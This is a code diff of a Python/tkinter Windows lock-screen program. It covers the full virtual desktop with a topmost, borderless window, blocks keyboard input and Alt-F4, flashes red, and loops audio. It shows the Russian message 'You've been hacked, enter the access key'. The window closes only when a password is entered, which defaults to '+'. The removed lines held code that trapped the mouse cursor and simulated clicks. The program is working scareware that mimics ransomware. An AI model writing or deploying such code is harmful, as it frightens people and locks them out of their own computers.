@@ -3,48 +3,27 @@ import os
 import tkinter as tk
 from tkinter import messagebox
 
-PASSWORD = os.getenv("LOCKSCREEN_PASSWORD", "+ä-+ä-+ä-")
+PASSWORD = os.getenv("LOCKSCREEN_PASSWORD", "+")
 
+class LockScreen(tk.Tk):
+    @staticmethod
+    def get_virtual_screen_bounds():
+        left = ctypes.windll.user32.GetSystemMetrics(76)  # SM_XVIRTUALSCREEN
+        top = ctypes.windll.user32.GetSystemMetrics(77)   # SM_YVIRTUALSCREEN
+        width = ctypes.windll.user32.GetSystemMetrics(78) # SM_CXVIRTUALSCREEN
+        height = ctypes.windll.user32.GetSystemMetrics(79) # SM_CYVIRTUALSCREEN
+        return left, top, width, height
 
-class RECT(ctypes.Structure):
-    _fields_ = [
-        ("left", ctypes.c_long),
-        ("top", ctypes.c_long),
-        ("right", ctypes.c_long),
-        ("bottom", ctypes.c_long),
-    ]
+    @staticmethod
+    def get_monitor_count():
+        return ctypes.windll.user32.GetSystemMetrics(80)  # SM_CMONITORS
 
-
-def get_monitor_bounds():
-    monitors = []
-
-    def callback(h_monitor, hdc_monitor, lprc_monitor, dw_data):
-        rect = lprc_monitor.contents
-        monitors.append((rect.left, rect.top, rect.right, rect.bottom))
-        return True
-
-    monitor_enum = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(RECT), ctypes.c_void_p)(callback)
-    user32 = ctypes.windll.user32
-
-    if not user32.EnumDisplayMonitors(None, None, monitor_enum, 0):
-        width = user32.GetSystemMetrics(0)
-        height = user32.GetSystemMetrics(1)
-        monitors.append((0, 0, width, height))
-
-    return monitors
-
-
-class LockScreen(tk.Toplevel):
-    def __init__(self, monitor_bounds, close_all):
+    def __init__(self):
         super().__init__()
-        self.close_all = close_all
-        self.is_closed = False
-        self.monitor_left, self.monitor_top, self.monitor_right, self.monitor_bottom = monitor_bounds
-        self.monitor_width = self.monitor_right - self.monitor_left
-        self.monitor_height = self.monitor_bottom - self.monitor_top
-
         self.title("Zugriff gesperrt")
-        self.geometry(f"{self.monitor_width}x{self.monitor_height}+{self.monitor_left}+{self.monitor_top}")
+        self.virtual_left, self.virtual_top, self.virtual_width, self.virtual_height = self.get_virtual_screen_bounds()
+
+        self.geometry(f"{self.virtual_width}x{self.virtual_height}+{self.virtual_left}+{self.virtual_top}")
         self.overrideredirect(True)
         self.attributes("-topmost", True)
         self.configure(bg="black")
@@ -55,30 +34,36 @@ class LockScreen(tk.Toplevel):
         self.bind("<Alt-F4>", lambda event: "break")
         self.bind("<KeyPress>", lambda event: "break")
 
-        # Maus in die Mitte zurücksetzen und alle 0.2s einen Klick simulieren
-        self.bind("<Motion>", self.keep_mouse_centered)
-        self.bind("<Button-1>", self.keep_mouse_centered)
-        self.bind("<Button-2>", self.keep_mouse_centered)
-        self.bind("<Button-3>", self.keep_mouse_centered)
-        self.after(500, self.fake_click)
-        self.after(50, self.center_mouse)
-
         self.start_audio()
 
         self.red_mode = False
         self.after(1000, self.blink_background)
 
-        self.label = tk.Label(
-            self,
-            text="Тебя взломали, введи ключ доступа, пожалуйста.",
-            bg="black",
-            fg="white",
-            font=("Arial", 24, "bold")
-        )
-        self.label.pack(expand=True)
+        self.monitor_count = self.get_monitor_count()
+        message = "Тебя взломали, введи ключ доступа, пожалуйста"
+        display_message = message if self.monitor_count >= 2 else "Тебя взломали, введи ключ доступа,\nпожалуйста"
+        width_ratio = 0.22 if self.monitor_count >= 2 else 0.8
+        message_width = max(240, int(self.virtual_width * width_ratio))
+        self.labels = []
+        message_positions = (0.22, 0.612) if self.monitor_count >= 2 else (0.5,)
+        for quarter_center in message_positions:
+            label = tk.Label(
+                self,
+                text=display_message,
+                bg="black",
+                fg="white",
+                font=("Arial", 30, "bold"),
+                anchor="center",
+                justify="center",
+                wraplength=message_width
+            )
+            label.place(relx=quarter_center, rely=0.4, anchor="center")
+            self.labels.append(label)
 
         frame = tk.Frame(self, bg="black")
-        frame.pack(pady=20)
+        password_x = 0.22 if self.monitor_count >= 2 else 0.5
+        password_y = 0.65 if self.monitor_count >= 2 else 0.88
+        frame.place(relx=password_x, rely=password_y, anchor="center")
 
         tk.Label(frame, text="Passwort:", bg="black", fg="white", font=("Arial", 12)).pack()
         self.entry = tk.Entry(frame, width=30, font=("Arial", 12), show="*")
@@ -87,7 +72,7 @@ class LockScreen(tk.Toplevel):
 
         btn = tk.Button(
             frame,
-            text="Bestätigen",
+            text="Подтвердить",
             command=self.check_password,
             width=20,
             font=("Arial", 11)
@@ -97,66 +82,27 @@ class LockScreen(tk.Toplevel):
         self.bind("<Return>", lambda event: self.check_password())
 
     def start_audio(self):
-        try:
-            self.mci_send = ctypes.windll.winmm.mciSendStringW
-        except Exception:
-            self.audio_aliases = []
-            return
-
+        self.mci_send = ctypes.windll.winmm.mciSendStringW
         self.audio_aliases = []
         audio_dir = os.path.dirname(os.path.abspath(__file__))
 
         for index, filename in enumerate(("s1.mp3", "s2.mp3", "s3.mp3")):
             path = os.path.join(audio_dir, filename)
             if not os.path.isfile(path):
-                continue
-
+                raise FileNotFoundError(f"Audiodatei nicht gefunden: {path}")
             alias = f"lockscreen_audio_{index}"
             command = f'open "{path}" type mpegvideo alias {alias}'
-            try:
-                if self.mci_send(command, None, 0, None) != 0:
-                    continue
-                if self.mci_send(f"play {alias} repeat", None, 0, None) != 0:
-                    self.mci_send(f"close {alias}", None, 0, None)
-                    continue
-                self.audio_aliases.append(alias)
-            except Exception:
-                continue
+            if self.mci_send(command, None, 0, None) != 0:
+                raise RuntimeError(f"Audiodatei konnte nicht geöffnet werden: {path}")
+            if self.mci_send(f"play {alias} repeat", None, 0, None) != 0:
+                raise RuntimeError(f"Audiodatei konnte nicht abgespielt werden: {path}")
+            self.audio_aliases.append(alias)
 
     def close_app(self):
-        if self.is_closed:
-            return
-        self.is_closed = True
-        self.close_all()
-
-    def stop_audio(self):
         for alias in getattr(self, "audio_aliases", []):
             self.mci_send(f"stop {alias}", None, 0, None)
             self.mci_send(f"close {alias}", None, 0, None)
-        self.audio_aliases = []
-
-    def center_mouse(self):
-        try:
-            center_x = self.monitor_left + (self.monitor_width // 2)
-            center_y = self.monitor_top + (self.monitor_height // 2)
-            ctypes.windll.user32.SetCursorPos(center_x, center_y)
-        except Exception:
-            pass
-        self.after(1, self.center_mouse)
-
-    def keep_mouse_centered(self, event=None):
-        self.center_mouse()
-
-    def fake_click(self):
-        try:
-            x = self.monitor_left + (self.monitor_width // 2)
-            y = self.monitor_top + (self.monitor_height // 2)
-            ctypes.windll.user32.SetCursorPos(x, y)
-            ctypes.windll.user32.mouse_event(0x0002, x, y, 0, 0)  # left down
-            ctypes.windll.user32.mouse_event(0x0004, x, y, 0, 0)  # left up
-        except Exception:
-            pass
-        self.after(200, self.fake_click)
+        self.destroy()
 
     def blink_background(self):
         self.red_mode = not self.red_mode
@@ -168,7 +114,8 @@ class LockScreen(tk.Toplevel):
             delay = 500
 
         self.configure(bg=color)
-        self.label.configure(bg=color, fg="white")
+        for label in self.labels:
+            label.configure(bg=color, fg="white")
         self.after(delay, self.blink_background)
 
     def check_password(self):
@@ -184,19 +131,5 @@ class LockScreen(tk.Toplevel):
             self.entry.focus_set()
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    root.withdraw()
-
-    windows = []
-
-    def close_all():
-        for window in windows:
-            window.stop_audio()
-            window.destroy()
-        root.destroy()
-
-    for bounds in get_monitor_bounds():
-        window = LockScreen(bounds, close_all)
-        windows.append(window)
-
-    root.mainloop()
+    app = LockScreen()
+    app.mainloop()
